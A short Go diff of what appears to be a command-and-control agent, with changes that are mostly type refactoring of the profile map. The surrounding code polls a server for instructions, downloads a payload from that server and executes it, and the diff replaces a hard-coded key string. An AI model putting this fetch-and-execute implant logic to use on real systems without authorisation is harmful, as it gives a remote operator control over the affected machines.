@@ -23,7 +23,7 @@ type executorFlags []string
 var iteration = 60
 var executors executorFlags
 
-func askForInstructions(profile map[string]string) {
+func askForInstructions(profile map[string]interface{}) {
 	commands := api.Instructions(profile)
 	if commands != nil && len(commands.([]interface{})) > 0 {
 		cmds := reflect.ValueOf(commands)
@@ -31,7 +31,7 @@ func askForInstructions(profile map[string]string) {
 			cmd := cmds.Index(i).Elem().String()
 			fmt.Println("[*] Running instruction")
 			command := util.Unpack([]byte(cmd))
-			api.Drop(profile["server"], command["payload"].(string))
+			api.Drop(profile["server"].(string), command["payload"].(string))
 			api.Execute(profile, command)
 		}
 	} else {
@@ -82,4 +82,4 @@ func main() {
 	}
 }
 
-var key = "3TEU4UD15V29OBJB7U9HNCR2JPWL1U"
+var key = "MEZZQ7CSHM42IQLFKKA1TP6U7KQSOT"
